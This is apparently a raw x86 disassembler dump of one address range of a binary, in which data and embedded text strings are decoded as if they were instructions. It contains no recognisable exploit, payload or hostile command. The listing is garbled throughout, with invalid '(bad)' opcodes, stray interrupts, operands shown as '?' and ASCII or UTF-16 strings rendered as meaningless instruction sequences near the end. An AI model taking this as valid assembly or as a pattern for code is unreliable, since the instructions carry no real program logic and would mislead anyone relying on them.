  427934:	ficom  WORD PTR [ebx]
  427936:	das    
  427937:	push   es
  427938:	into   
  427939:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  427943:	sub    bl,0x12
  427946:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  427950:	(bad)  
  427951:	adc    al,0x0
  427953:	(bad)  
  427954:	xor    BYTE PTR [eax],al
  427956:	(bad)  
  427957:	dec    esp
  427958:	add    dh,dl
  42795a:	mov    BYTE PTR [ebp+0xff77],bh
  427960:	jmp    0x427918
  427962:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  42796c:	mov    BYTE PTR [ebx-0xf],al
  42796f:	das    
  427970:	add    eax,0x80808019
  427975:	adc    bh,bh
  427977:	xchg   ecx,eax
  427978:	aaa    
  427979:	ficom  WORD PTR [ebx]
  42797b:	(bad)  
  42797c:	mov    BYTE PTR [ebx-0xf],al
  42797f:	das    
  427980:	add    eax,0x8080818e
  427985:	adc    bh,bh
  427987:	(bad)  
  427988:	aaa    
  427989:	ficom  WORD PTR [ebx]
  42798b:	(bad)  
  42798c:	test   BYTE PTR [ebx-0xf],al
  42798f:	aam    0x1c
  427991:	adc    bh,bh
  427993:	fidiv  WORD PTR [edi]
  427995:	ficom  WORD PTR [ebx]
  427997:	(bad)  
  427998:	mov    BYTE PTR [ebx-0xf],al
  42799b:	das    
  42799c:	add    eax,0x80808142
  4279a1:	adc    bh,bh
  4279a3:	out    0x37,al
  4279a5:	ficom  WORD PTR [ebx]
  4279a7:	in     al,dx
  4279a8:	iret   
  4279a9:	int    0x96
  4279ab:	mov    ch,cl
  4279ad:	(bad)  
  4279ae:	dec    esp
  4279af:	int    0xe6
  4279b1:	mov    ch,cl
  4279b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279b4:	dec    esp
  4279b5:	cmp    edx,DWORD PTR [ecx]
  4279b7:	cmp    esp,ebx
  4279b9:	das    
  4279ba:	inc    ebp
  4279bb:	sti    
  4279bc:	xchg   edx,eax
  4279bd:	shr    ecx,cl
  4279bf:	sub    BYTE PTR [edx],dl
  4279c1:	clc    
  4279c2:	add    BYTE PTR [eax-0x102c9380],0x92
  4279c9:	cmp    ebx,ebp
  4279cb:	push   ebx
  4279cc:	clc    
  4279cd:	int    0xe6
  4279cf:	mov    BYTE PTR [ebx-0x2b],dl
  4279d2:	int    0xa6
  4279d4:	dec    esp
  4279d5:	xchg   ecx,ebx
  4279d7:	sbb    esi,esp
  4279d9:	or     dl,BYTE PTR [esi+0x4cd60a88]
  4279df:	int    0x96
  4279e1:	mov    ch,cl
  4279e3:	(bad)  
  4279e4:	dec    esp
  4279e5:	int    0xe6
  4279e7:	mov    ch,cl
  4279e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279ea:	dec    esp
  4279eb:	cmp    edx,DWORD PTR [ecx]
  4279ed:	cmp    esp,ebx
  4279ef:	das    
  4279f0:	inc    ebp
  4279f1:	sti    
  4279f2:	xchg   edx,eax
  4279f3:	shr    ecx,cl
  4279f5:	sub    BYTE PTR [ebx],bh
  4279f7:	fst    st(3)
  4279f9:	out    dx,eax
  4279fa:	xchg   edx,eax
  4279fb:	adc    bh,al
  4279fd:	add    BYTE PTR [eax-0x2aac9380],0x53
  427a04:	clc    
  427a05:	ds xchg esi,eax
  427a07:	xor    BYTE PTR [esi],bl
  427a09:	(bad)  
  427a0a:	adc    al,0xcd
  427a0c:	xchg   esi,eax
  427a0d:	cmp    al,0xcd
  427a0f:	(bad)  
  427a10:	inc    esp
  427a11:	int    0x96
  427a13:	xor    ch,cl
  427a15:	(bad)  
  427a16:	adc    al,0xcd
  427a18:	xchg   esi,eax
  427a19:	xor    ch,cl
  427a1b:	(bad)  
  427a1c:	adc    al,0xcd
  427a1e:	out    0x30,al
  427a20:	int    0xa6
  427a22:	adc    al,0x3b
  427a24:	adc    DWORD PTR [ebx],edi
  427a26:	jecxz  0x427a57
  427a28:	inc    ebp
  427a29:	sti    
  427a2a:	xchg   edx,eax
  427a2b:	shr    ecx,cl
  427a2d:	sub    BYTE PTR [ebx],bh
  427a2f:	fst    QWORD PTR [edx]
  427a31:	clc    
  427a32:	add    BYTE PTR [eax-0x102c9380],0x92
  427a39:	push   ebx
  427a3a:	clc    
  427a3b:	int    0xe6
  427a3d:	cmp    al,0x53
  427a3f:	aad    0xcd
  427a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a42:	inc    esp
  427a43:	cmp    edi,edx
  427a45:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427a4b:	lea    eax,[edi+ebp*1+0x45]
  427a4f:	loope  0x4279e3
  427a51:	cmp    ecx,ebx
  427a53:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427a59:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427a5e:	lea    esi,[eax]
  427a60:	shr    esp,cl
  427a62:	xchg   edx,eax
  427a63:	push   ebx
  427a64:	popf   
  427a65:	xchg   ecx,ebx
  427a67:	int    0x96
  427a69:	adc    al,0x1b
  427a6b:	hlt    
  427a6c:	add    al,0xf2
  427a6e:	std    
  427a6f:	shr    edi,cl
  427a71:	sub    BYTE PTR [ebx],bh
  427a73:	ins    DWORD PTR es:[edi],dx
  427a74:	adc    al,BYTE PTR [edx]
  427a76:	aam    0x37
  427a78:	ficom  WORD PTR [ebx]
  427a7a:	adc    bh,bl
  427a7c:	mov    ebp,0xcd25230a
  427a81:	out    0x3c,al
  427a83:	int    0xa6
  427a85:	inc    esp
  427a86:	add    al,0xe9
  427a88:	std    
  427a89:	adc    bh,al
  427a8b:	aam    0x37
  427a8d:	ficom  WORD PTR [ebx]
  427a8f:	adc    dh,ah
  427a91:	mov    ebp,0x8725230a
  427a96:	lock int 0xe6
  427a99:	and    al,0x1b
  427a9b:	aad    0x53
  427a9d:	rcl    BYTE PTR [esi-0x43],cl
  427aa0:	or     ah,BYTE PTR [ebx]
  427aa2:	and    eax,0x12025370
  427aa7:	not    esi
  427aa9:	aaa    
  427aaa:	ficom  WORD PTR [ebx]
  427aac:	cwde   
  427aad:	add    dh,dl
  427aaf:	xor    al,0x0
  427ab1:	(bad)  
  427ab2:	sub    al,0x9a
  427ab4:	add    dh,dl
  427ab6:	sbb    al,0x0
  427ab8:	(bad)  
  427ab9:	adc    al,0x0
  427abb:	(bad)  
  427abc:	xor    BYTE PTR [eax],al
  427abe:	(bad)  
  427abf:	dec    esp
  427ac0:	add    dh,dl
  427ac2:	mov    BYTE PTR [ebp+0xfef4],bh
  427ac8:	or     cl,BYTE PTR [ebx-0x57557433]
  427ace:	arpl   bx,cx
  427ad0:	sar    BYTE PTR [eax+eax*4],cl
  427ad3:	int    0x96
  427ad5:	mov    ch,cl
  427ad7:	(bad)  
  427ad8:	dec    esp
  427ad9:	int    0xe6
  427adb:	mov    ch,cl
  427add:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ade:	dec    esp
  427adf:	cmp    esp,ebx
  427ae1:	cmp    edx,DWORD PTR [ecx]
  427ae3:	das    
  427ae4:	inc    ebp
  427ae5:	sti    
  427ae6:	xchg   edx,eax
  427ae7:	shr    ecx,cl
  427ae9:	sub    BYTE PTR [edx],dl
  427aeb:	clc    
  427aec:	add    BYTE PTR [eax-0x102c9380],0x92
  427af3:	cmp    ebx,ebp
  427af5:	push   ebx
  427af6:	aad    0x53
  427af8:	clc    
  427af9:	int    0xe6
  427afb:	xor    ch,cl
  427afd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427afe:	adc    al,0x53
  427b00:	fst    DWORD PTR [ebx-0xc]
  427b03:	or     dl,BYTE PTR [esi+0x14d60a30]
  427b09:	int    0x96
  427b0b:	cmp    al,0xcd
  427b0d:	(bad)  
  427b0e:	inc    esp
  427b0f:	int    0x96
  427b11:	xor    ch,cl
  427b13:	(bad)  
  427b14:	adc    al,0xcd
  427b16:	xchg   esi,eax
  427b17:	mov    ch,cl
  427b19:	(bad)  
  427b1a:	dec    esp
  427b1b:	int    0x96
  427b1d:	mov    ch,cl
  427b1f:	(bad)  
  427b20:	dec    esp
  427b21:	int    0xe6
  427b23:	mov    ch,cl
  427b25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b26:	dec    esp
  427b27:	cmp    esp,ebx
  427b29:	cmp    edx,DWORD PTR [ecx]
  427b2b:	das    
  427b2c:	inc    ebp
  427b2d:	sti    
  427b2e:	xchg   edx,eax
  427b2f:	shr    ecx,cl
  427b31:	sub    BYTE PTR [edx],dl
  427b33:	clc    
  427b34:	add    BYTE PTR [eax-0x22c49380],0x53
  427b3b:	aad    0xd3
  427b3d:	out    dx,eax
  427b3e:	xchg   edx,eax
  427b3f:	push   ebx
  427b40:	clc    
  427b41:	int    0xe6
  427b43:	xor    ch,cl
  427b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b46:	adc    al,0x3b
  427b48:	cli    
  427b49:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427b4f:	lea    edx,[edi+ebp*1]
  427b52:	inc    ebp
  427b53:	loope  0x427ae7
  427b55:	cmp    ecx,ebx
  427b57:	push   ebx
  427b58:	cli    
  427b59:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427b5f:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427b64:	push   ebx
  427b65:	popf   
  427b66:	int    0x76
  427b68:	cmp    al,0xcd
  427b6a:	lea    eax,[edi+eax*4-0x27]
  427b6e:	int    0xe6
  427b70:	cmp    al,0x1b
  427b72:	hlt    
  427b73:	int    0xa6
  427b75:	inc    esp
  427b76:	adc    al,BYTE PTR [edx]
  427b78:	mov    ebp,0x5625230a
  427b7d:	jnp    0x427bb6
  427b7f:	ficom  WORD PTR [ebx]
  427b81:	das    
  427b82:	inc    ebp
  427b83:	jge    0x427b17
  427b85:	shr    ecx,cl
  427b87:	sub    bl,dl
  427b89:	jmp    0x427b1d
  427b8b:	cmp    ebx,ebp
  427b8d:	adc    bh,al
  427b8f:	add    BYTE PTR [eax-0xfac9380],0x53
  427b96:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427b9c:	lea    ecx,[eax-0x32b36933]
  427ba2:	out    0x30,al
  427ba4:	int    0xa6
  427ba6:	adc    al,0x4
  427ba8:	repnz std 
  427baa:	add    al,0xe9
  427bac:	std    
  427bad:	adc    al,BYTE PTR [edx]
  427baf:	aam    0x37
  427bb1:	ficom  WORD PTR [ebx]
  427bb3:	adc    bh,al
  427bb5:	aam    0x37
  427bb7:	ficom  WORD PTR [ebx]
  427bb9:	shr    edi,cl
  427bbb:	sub    BYTE PTR [ebx],bh
  427bbd:	ins    DWORD PTR es:[edi],dx
  427bbe:	adc    bh,bl
  427bc0:	mov    ebp,0x1225230a
  427bc5:	hlt    
  427bc6:	mov    ebp,0x8725230a
  427bcb:	lock sbb edx,ebp
  427bce:	jmp    0x427c17
  427bd0:	inc    DWORD PTR [eax]
  427bd2:	add    BYTE PTR [esi-0x12fb1233],dl
  427bd8:	sbb    al,0x98
  427bda:	pop    edi
  427bdb:	(bad)  
  427bdc:	aaa    
  427bdd:	ficom  WORD PTR [ebx]
  427bdf:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427be5:	and    esp,DWORD PTR ds:0xc9f5760a
  427beb:	jbe    0x427baa
  427bed:	xchg   ecx,eax
  427bee:	aaa    
  427bef:	ficom  WORD PTR [ebx]
  427bf1:	or     dh,BYTE PTR [esi-0x13]
  427bf4:	int    0x96
  427bf6:	adc    ebp,ecx
  427bf8:	(bad)  
  427bf9:	cmc    
  427bfa:	call   0xefd3:0x92fb452f
  427c01:	xchg   edx,eax
  427c02:	int    0xd6
  427c04:	adc    ebp,ecx
  427c06:	out    0xf5,al
  427c08:	jo     0x427c1c
  427c0a:	sti    
  427c0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c0c:	mov    esi,0x3b4229
  427c11:	jno    0x427c66
  427c13:	(bad)  [edx]
  427c15:	xchg   esi,eax
  427c16:	std    
  427c17:	int    0x96
  427c19:	dec    esp
  427c1a:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427c20:	iret   
  427c21:	jbe    0x427c20
  427c23:	add    dh,dl
  427c25:	mov    bl,dl
  427c27:	mov    ecx,0xd6007028
  427c2c:	dec    esp
  427c2d:	add    dh,dl
  427c2f:	in     eax,dx
  427c30:	add    dh,dl
  427c32:	mov    ebp,0xf5d600
  427c37:	(bad)  
  427c38:	adc    DWORD PTR [ebp+0xfde6],edi
  427c3e:	stos   BYTE PTR es:[edi],al
  427c3f:	or     dh,BYTE PTR [esi-0x3]
  427c42:	int    0x76
  427c44:	std    
  427c45:	test   al,0xcb
  427c47:	ror    BYTE PTR [eax-0x12326980],cl
  427c4d:	add    al,0xb5
  427c4f:	stc    
  427c50:	add    al,0xed
  427c52:	inc    esp
  427c53:	cwde   
  427c54:	leave  
  427c55:	je     0x427c8b
  427c57:	xor    al,0x80
  427c59:	add    BYTE PTR [eax+0x3474c980],0x44
  427c60:	add    BYTE PTR [eax+0x74cf8080],0x34
  427c67:	xor    BYTE PTR [eax+0x0],dh
  427c6a:	(bad)  
  427c6b:	xor    al,0x0
  427c6d:	(bad)  
  427c6e:	sub    al,0x0
  427c70:	(bad)  
  427c71:	and    al,0x0
  427c73:	(bad)  
  427c74:	sbb    al,0x0
  427c76:	(bad)  
  427c77:	adc    al,0x0
  427c79:	(bad)  
  427c7a:	xor    BYTE PTR [eax],al
  427c7c:	(bad)  
  427c7d:	dec    esp
  427c7e:	add    dh,dl
  427c80:	mov    BYTE PTR [ebp+0xe7e7],bh
  427c86:	int    0x76
  427c88:	mov    BYTE PTR [edx],cl
  427c8a:	je     0x427cc0
  427c8c:	test   ch,cl
  427c8e:	je     0x427cc4
  427c90:	xor    al,0x6
  427c92:	ins    DWORD PTR es:[edi],dx
  427c93:	das    
  427c94:	add    eax,0x80808017
  427c99:	int    0x74
  427c9b:	xor    al,0x44
  427c9d:	push   es
  427c9e:	ins    DWORD PTR es:[edi],dx
  427c9f:	das    
  427ca0:	add    eax,0x8080800a
  427ca5:	add    ah,dl
  427ca7:	xor    al,0x24
  427ca9:	add    ah,dl
  427cab:	xor    al,0x24
  427cad:	add    ah,dl
  427caf:	xor    al,0x24
  427cb1:	int    0x74
  427cb3:	xor    al,0x50
  427cb5:	add    cl,dh
  427cb7:	int    0x74
  427cb9:	xor    al,0x84
  427cbb:	int    0x74
  427cbd:	xor    al,0x84
  427cbf:	int    0x74
  427cc1:	xor    al,0x84
  427cc3:	iret   
  427cc4:	jbe    0x427c4a
  427cc6:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427cca:	int    0x74
  427ccc:	xor    al,0x3c
  427cce:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427cd2:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427cd6:	int    0x74
  427cd8:	xor    al,0x84
  427cda:	int    0x74
  427cdc:	xor    al,0x84
  427cde:	int    0x8c
  427ce0:	xor    al,0x84
  427ce2:	int    0xa
  427ce4:	and    eax,0xcd808081
  427ce9:	xor    ebp,ecx
  427ceb:	aam    0x34
  427ced:	mov    ch,cl
  427cef:	add    DWORD PTR ds:0x5e808081,ebp
  427cf5:	sbb    BYTE PTR [edi],ch
  427cf7:	or     edx,DWORD PTR ds:0xcd808081
  427cfd:	xor    ch,cl
  427cff:	push   eax
  427d00:	int    0x62
  427d02:	fs iret 
  427d04:	xchg   esp,eax
  427d05:	sbb    BYTE PTR [eax-0x33],dh
  427d08:	push   ecx
  427d09:	int    0x22
  427d0b:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427d11:	pop    esi
  427d12:	sbb    BYTE PTR [edi],ch
  427d14:	add    al,0x7b
  427d16:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427d20:	dec    edx
  427d21:	int    0x80
  427d23:	xor    ecx,DWORD PTR [edi]
  427d25:	xchg   ebx,edx
  427d27:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427d2d:	or     ch,0x74
  427d30:	xor    al,0x44
  427d32:	push   es
  427d33:	ins    DWORD PTR es:[edi],dx
  427d34:	das    
  427d35:	push   es
  427d36:	cwde   
  427d37:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427d41:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427d4b:	je     0x427d81
  427d4d:	test   ch,cl
  427d4f:	add    DWORD PTR ds:0xcd808081,esp
  427d55:	or     BYTE PTR [edx],0x74
  427d58:	xor    al,0x4c
  427d5a:	int    0x74
  427d5c:	xor    al,0x84
  427d5e:	int    0x1
  427d60:	or     DWORD PTR [ecx-0x7f327f80],eax
  427d66:	int    0x80
  427d68:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427d6c:	int    0x74
  427d6e:	xor    al,0x84
  427d70:	int    0x1
  427d72:	int3   
  427d73:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427d7d:	dec    esp
  427d7e:	int    0x74
  427d80:	xor    al,0x84
  427d82:	int    0x8c
  427d84:	xor    al,0x84
  427d86:	int    0x1
  427d88:	popf   
  427d89:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427d93:	or     ch,0x89
  427d96:	imul   edx,ecx,0x3b358621
  427d9c:	jns    0x427da2
  427d9e:	add    bh,bh
  427da0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427da6:	push   ebx
  427da7:	jge    0x427db3
  427da9:	mov    WORD PTR [esp+ecx*2],?
  427dac:	leave  
  427dad:	je     0x427de3
  427daf:	mov    BYTE PTR [eax-0x327f7f80],al
  427db5:	je     0x427deb
  427db7:	xor    al,0x6
  427db9:	ins    DWORD PTR es:[edi],dx
  427dba:	aam    0x73
  427dbc:	int    0x74
  427dbe:	xor    al,0x30
  427dc0:	add    al,0xbd
  427dc2:	adc    ah,0x52
  427dc5:	jl     0x427d9b
  427dc7:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427dcb:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427dcf:	add    ah,dl
  427dd1:	xor    al,0x2c
  427dd3:	add    ah,dl
  427dd5:	xor    al,0x2c
  427dd7:	add    ah,dl
  427dd9:	xor    al,0x2c
  427ddb:	add    ah,dl
  427ddd:	xor    al,0x2c
  427ddf:	int    0x74
  427de1:	xor    al,0x54
  427de3:	add    cl,dh
  427de5:	in     al,dx
  427de6:	cmp    BYTE PTR [eax],al
  427de8:	aam    0x34
  427dea:	and    al,0x0
  427dec:	aam    0x34
  427dee:	and    al,0x0
  427df0:	aam    0x34
  427df2:	and    al,0xcd
  427df4:	je     0x427e2a
  427df6:	push   eax
  427df7:	add    cl,dh
  427df9:	in     al,dx
  427dfa:	and    al,BYTE PTR [eax]
  427dfc:	aam    0x34
  427dfe:	adc    al,0xcd
  427e00:	je     0x427e36
  427e02:	cmp    al,0x0
  427e04:	icebp  
  427e05:	in     al,dx
  427e06:	xchg   ch,cl
  427e08:	je     0x427e3e
  427e0a:	xor    al,0x0
  427e0c:	icebp  
  427e0d:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427e11:	int    0x74
  427e13:	xor    al,0x4c
  427e15:	push   es
  427e16:	ins    DWORD PTR es:[edi],dx
  427e17:	aam    0x4e
  427e19:	int    0x74
  427e1b:	xor    al,0x84
  427e1d:	leave  
  427e1e:	add    DWORD PTR [ebp+0x41808081],ebp
  427e24:	and    DWORD PTR [esi+0x3474cd35],eax
  427e2a:	mov    ch,cl
  427e2c:	mov    WORD PTR [esp+eax*4],?
  427e2f:	int    0xa
  427e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e32:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e3c:	and    DWORD PTR [esi+0x3474cd35],eax
  427e42:	mov    ch,cl
  427e44:	mov    WORD PTR [eax+ecx*4],?
  427e47:	cmp    edi,DWORD PTR [ecx+0x4]
  427e4a:	add    bh,bh
  427e4c:	shl    edx,cl
  427e4e:	sub    bl,dl
  427e50:	mov    ebp,0xcdd35392
  427e55:	mov    WORD PTR [esp+ecx*2],?
  427e58:	inc    ebx
  427e59:	rcl    esi,cl
  427e5b:	and    ecx,ebp
  427e5d:	je     0x427e93
  427e5f:	test   ch,cl
  427e61:	mov    WORD PTR [esp+eax*4],?
  427e64:	int    0xa
  427e66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e67:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427e71:	add    BYTE PTR [eax],0x70
  427e74:	cmp    al,0xec
  427e76:	push   ds
  427e77:	iret   
  427e78:	jbe    0x427dfe
  427e7a:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427e7e:	int    0x74
  427e80:	xor    al,0x4c
  427e82:	int    0x8c
  427e84:	xor    al,0x84
  427e86:	int    0xa
  427e88:	in     al,0x81
  427e8a:	add    BYTE PTR [eax-0x777e7633],0xcd
  427e91:	je     0x427ec7
  427e93:	test   ch,cl
  427e95:	add    ebp,ebp
  427e97:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427ea1:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427ea7:	or     bh,0x84
  427eaa:	adc    cl,ch
  427eac:	mov    WORD PTR [esp+eax*4],?
  427eaf:	int    0xa
  427eb1:	in     al,0x81
  427eb3:	add    BYTE PTR [eax-0x76327f33],0x81
  427eba:	mov    BYTE PTR [eax-0x2d591833],ch
  427ec0:	sub    al,0x80
  427ec2:	lds    edx,FWORD PTR [eax+0x75]
  427ec5:	ins    BYTE PTR es:[edi],dx
  427ec6:	jae    0x427f3f
  427ec8:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427ecc:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427ed0:	add    BYTE PTR [ecx+0x74],ah
  427ed3:	ins    BYTE PTR es:[edi],dx
  427ed4:	popa   
  427ed5:	inc    esp
  427ed6:	gs popa 
  427ed8:	fs push 0x6561686d
  427ede:	add    BYTE PTR fs:[ebp+0x74],ah
  427ee2:	push   0x65726143
  427ee7:	outs   dx,DWORD PTR ds:[esi]
  427ee8:	jns    0x427f50
  427eea:	add    BYTE PTR gs:[edi+0x72],dh
  427eee:	jns    0x427f5d
  427ef0:	popa   
  427ef1:	outs   dx,DWORD PTR ds:[esi]
  427ef2:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427ef6:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427efa:	push   0x6f6d6568
  427eff:	add    BYTE PTR fs:[edx+0x65],dl
  427f03:	arpl   WORD PTR [ebx+0x62],si
  427f06:	popa   
  427f07:	ins    BYTE PTR es:[edi],dx
  427f08:	jne    0x427f82
  427f0a:	gs jae 0x427f0d
  427f0d:	ins    DWORD PTR es:[edi],dx
  427f0e:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427f15:	outs   dx,DWORD PTR ds:[esi]
  427f16:	jb     0x427f87
  427f18:	jo     0x427f1a
  427f1a:	ja     0x427f7d
  427f1c:	gs je  0x427f8e
  427f1f:	jb     0x427f90
  427f21:	bound  esp,QWORD PTR [ecx+0x70]
  427f24:	add    BYTE PTR [ebx+0x69],cl
  427f27:	outs   dx,BYTE PTR ds:[esi]
  427f28:	addr16 addr16 popa 
  427f2b:	outs   dx,BYTE PTR ds:[esi]
  427f2c:	arpl   WORD PTR [ecx+0x70],sp
  427f2f:	add    BYTE PTR [edi+0x6e],al
  427f32:	jne    0x427fa7
  427f34:	je     0x427f9b
  427f36:	outs   dx,BYTE PTR ds:[esi]
  427f37:	push   esi
  427f38:	popa   
  427f39:	jb     0x427fb4
  427f3b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f3f:	jb     0x427f91
  427f41:	popa   
  427f42:	ins    BYTE PTR es:[edi],dx
  427f43:	ins    DWORD PTR es:[edi],dx
  427f44:	je     0x427faf
  427f46:	outs   dx,DWORD PTR ds:[esi]
  427f47:	ja     0x427fae
  427f49:	jb     0x427f4b
  427f4b:	jo     0x427fb2
  427f4d:	ins    DWORD PTR es:[edi],dx
  427f4e:	jns    0x427fc4
  427f50:	push   0x6f656562
  427f55:	outs   dx,BYTE PTR ds:[esi]
  427f56:	push   eax
  427f57:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427f5e:	inc    ebx
  427f5f:	outs   dx,DWORD PTR ds:[esi]
  427f60:	popa   
  427f61:	ins    BYTE PTR es:[edi],dx
  427f62:	popa   
  427f63:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427f6a:	je     0x427fe5
  427f6c:	outs   dx,DWORD PTR gs:[esi]
  427f6e:	outs   dx,BYTE PTR ds:[esi]
  427f6f:	gs ins BYTE PTR es:[edi],dx
  427f71:	inc    ebx
  427f72:	push   0x54007261
  427f77:	jns    0x427fe9
  427f79:	jns    0x427fe8
  427f7b:	jne    0x427fe2
  427f7d:	imul   eax,DWORD PTR gs:[eax],0x70
  427f81:	outs   dx,DWORD PTR ds:[esi]
  427f82:	je     0x427fc6
  427f84:	gs gs jb 0x427ff8
  427f88:	outs   dx,DWORD PTR ds:[esi]
  427f89:	je     0x427ff6
  427f8b:	imul   eax,DWORD PTR [eax],0x616c7548
  427f91:	jo     0x427ffc
  427f93:	popa   
  427f94:	ins    BYTE PTR es:[edi],dx
  427f95:	dec    ebx
  427f96:	outs   dx,BYTE PTR ds:[esi]
  427f97:	popa   
  427f98:	jo     0x428013
  427f9a:	add    BYTE PTR gs:[eax+0x6f],dh
  427f9e:	je     0x427fe2
  427fa0:	gs ins BYTE PTR es:[edi],dx
  427fa2:	jae    0x428013
  427fa4:	js     0x427fa6
  427fa6:	popa   
  427fa7:	data16 je 0x427ff0
  427faa:	ins    BYTE PTR es:[edi],dx
  427fab:	popa   
  427fac:	imul   esp,DWORD PTR [ebp+0x78],0x70
  427fb0:	gs jae 0x428014
  427fb3:	jb     0x427fb5
  427fb5:	inc    edx
  427fb6:	ins    BYTE PTR es:[edi],dx
  427fb7:	popa   
  427fb8:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  427fbc:	je     0x428024
  427fbe:	ins    BYTE PTR es:[edi],dx
  427fbf:	jns    0x428036
  427fc1:	push   0x6d6d6800
  427fc6:	popa   
  427fc7:	inc    edi
  427fc8:	popa   
  427fc9:	ins    BYTE PTR es:[edi],dx
  427fca:	ins    BYTE PTR es:[edi],dx
  427fcb:	push   0x48007361
  427fd0:	outs   dx,DWORD PTR ds:[esi]
  427fd1:	ins    DWORD PTR es:[edi],dx
  427fd2:	outs   dx,DWORD PTR gs:[esi]
  427fd4:	jb     0x42803b
  427fd6:	data16 jno 0x428042
  427fd9:	jae    0x42803c
  427fdb:	bound  esi,QWORD PTR [eax+0x61]
  427fde:	add    BYTE PTR [ebp+0x74],ah
  427fe1:	outs   dx,BYTE PTR ds:[esi]
  427fe2:	gs addr16 jbe 0x428047
  427fe6:	je     0x428061
  427fe8:	gs popa 
  427fea:	add    BYTE PTR [ebp+0x67],ah
  427fed:	outs   dx,DWORD PTR ds:[esi]
  427fee:	inc    edi
  427fef:	popa   
  427ff0:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  427ff8:	jo     0x42805f
  427ffa:	fs jbe 0x42805e
  427ffd:	je     0x428074
  427fff:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  428003:	outs   dx,DWORD PTR ds:[esi]
  428004:	add    BYTE PTR [edx+0x0],ch
  428007:	jne    0x428009
  428009:	add    BYTE PTR [bp+0x0],ch
  42800d:	popa   
  42800e:	add    BYTE PTR [esi+0x0],ch
  428011:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428016:	add    BYTE PTR [ebp+0x0],dh
  428019:	ins    DWORD PTR es:[edi],dx
  42801a:	add    BYTE PTR [eax],al
  42801c:	add    BYTE PTR [edi+0x0],ch
  42801f:	jb     0x428021
  428021:	ja     0x428023
  428023:	imul   eax,DWORD PTR [eax],0x680073
  428029:	outs   dx,BYTE PTR ds:[esi]
  42802a:	add    BYTE PTR [ecx+0x0],ch
  42802d:	add    BYTE PTR fs:[ecx+0x0],ch
  428031:	ja     0x428033
  428033:	imul   eax,DWORD PTR [eax],0x65006e
  428039:	push   0x70000000
  42803e:	add    BYTE PTR [ecx+0x0],ah
  428041:	je     0x428043
  428043:	jbe    0x428045
  428045:	add    BYTE PTR gs:[ebp+0x0],ah
  428049:	je     0x42804b
  42804b:	add    BYTE PTR gs:[edi+0x0],ah
  42804f:	ins    BYTE PTR es:[edi],dx
  428050:	add    BYTE PTR [ecx+0x0],ah
  428053:	imul   eax,DWORD PTR [eax],0x66
  428059:	outs   dx,DWORD PTR ds:[esi]
  42805a:	add    BYTE PTR [esi+0x0],ch
  42805d:	je     0x42805f
  42805f:	popa   
  428060:	add    BYTE PTR [edi+0x0],dh
  428063:	push   ebx
  428064:	add    BYTE PTR [edi+0x0],ch
  428067:	arpl   WORD PTR [eax],ax
  428069:	imul   eax,DWORD PTR [eax],0x61
  42806c:	add    BYTE PTR [esi+0x0],dh
  42806f:	outs   dx,DWORD PTR ds:[esi]
  428070:	add    BYTE PTR [eax],al
  428072:	add    BYTE PTR [ebp+0x0],ch
  428075:	jns    0x428077
  428077:	add    BYTE PTR gs:[esi+0x0],ah
  42807b:	ins    BYTE PTR es:[edi],dx
  42807c:	add    BYTE PTR [ecx+0x0],ah
  42807f:	jns    0x428081
  428081:	jbe    0x428083
  428083:	popa   
  428084:	add    BYTE PTR [esi+0x0],ch
  428087:	popa   
  428088:	add    BYTE PTR [edi+0x0],ah
  42808b:	outs   dx,DWORD PTR ds:[esi]
  42808c:	add    BYTE PTR [eax],al
  42808e:	add    BYTE PTR [edi+0x0],ch
  428091:	jb     0x428093
